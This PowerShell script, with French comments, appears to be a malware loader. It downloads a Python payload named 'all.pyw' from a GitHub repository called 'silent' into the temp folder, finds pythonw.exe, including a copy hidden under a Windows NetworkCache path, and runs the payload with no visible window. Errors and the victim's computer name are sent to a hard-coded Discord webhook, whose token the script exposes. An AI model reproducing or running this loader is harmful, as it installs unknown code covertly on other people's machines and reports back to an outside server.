$ErrorActionPreference = 'Stop'
$WEBHOOK = 'https://discord.com/api/webhooks/1553812001174851644/XxjDh7jerGG_jVNKlmSF48UEycZFiD7PDwMGMSKiuQ7d9RWeYt-JvGOS3Y-5xPGX3D-E'

function Report-Error($msg) {
    try {
        $body = @{ content = "**ERREUR LAUNCHER — $env:COMPUTERNAME**`n``````$msg``````" } | ConvertTo-Json
        Invoke-RestMethod -Uri $WEBHOOK -Method Post -ContentType 'application/json' -Body $body -TimeoutSec 10 > $null
    } catch {}
}

function Resolve-Pythonw {
    # 1) pythonw.exe du PATH
    try {
        $cmd = Get-Command pythonw.exe -ErrorAction SilentlyContinue
        if ($cmd -and $cmd.Source -and (Test-Path $cmd.Source)) {
            return $cmd.Source
        }
    } catch {}

    # 2) Python embarqué dans NetworkCache
    $embedded = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\NetworkCache\Python310\pythonw.exe'
    if (Test-Path $embedded) {
        return $embedded
    }

    # 3) Autres emplacements connus (fallback)
    $candidates = @(
        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python310\pythonw.exe'),
        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python311\pythonw.exe'),
        (Join-Path $env:LOCALAPPDATA 'Programs\Python\Python312\pythonw.exe'),
        'C:\Python310\pythonw.exe',
        'C:\Python311\pythonw.exe',
        'C:\Python312\pythonw.exe',
        'C:\Program Files\Python310\pythonw.exe',
        'C:\Program Files\Python311\pythonw.exe',
        'C:\Program Files\Python312\pythonw.exe'
    )
    foreach ($c in $candidates) {
        if ($c -and (Test-Path $c)) {
            return $c
        }
    }

    return $null
}

try {
    $tmp = Join-Path $env:TEMP 'all.pyw'

    # Étape 1 : téléchargement
    try {
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Paladu13/silent/main/all.pyw' -OutFile $tmp -UseBasicParsing
    } catch {
        Report-Error "Erreur téléchargement all.pyw : $($_.Exception.Message)"
        exit 1
    }

    if (-not (Test-Path $tmp)) {
        Report-Error "all.pyw non téléchargé"
        exit 1
    }

    # Étape 2 : détection admin
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        $isAdmin = $false
    }

    # Étape 3 : résolution de pythonw.exe (PATH puis NetworkCache puis fallbacks)
    $pythonw = Resolve-Pythonw
    if (-not $pythonw) {
        Report-Error "pythonw.exe introuvable (ni PATH, ni NetworkCache, ni emplacements standards)"
        exit 1
    }

    # Étape 4 : lancement caché via pythonw
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $pythonw
        $psi.Arguments = '"' + $tmp + '"'
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = 'Hidden'
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    } catch {
        # Fallback : Start-Process direct
        try {
            Start-Process -FilePath $pythonw -ArgumentList @($tmp) -WindowStyle Hidden
        } catch {
            # Dernier recours : lancer le .pyw directement
            try {
                Start-Process -FilePath $tmp -WindowStyle Hidden
            } catch {
                Report-Error "Impossible de lancer all.pyw avec $pythonw : $($_.Exception.Message)"
                exit 1
            }
        }
    }
} catch {
    Report-Error "Erreur globale : $($_.Exception.Message) | Ligne: $($_.InvocationInfo.ScriptLineNumber)"
    exit 1
}

exit 0
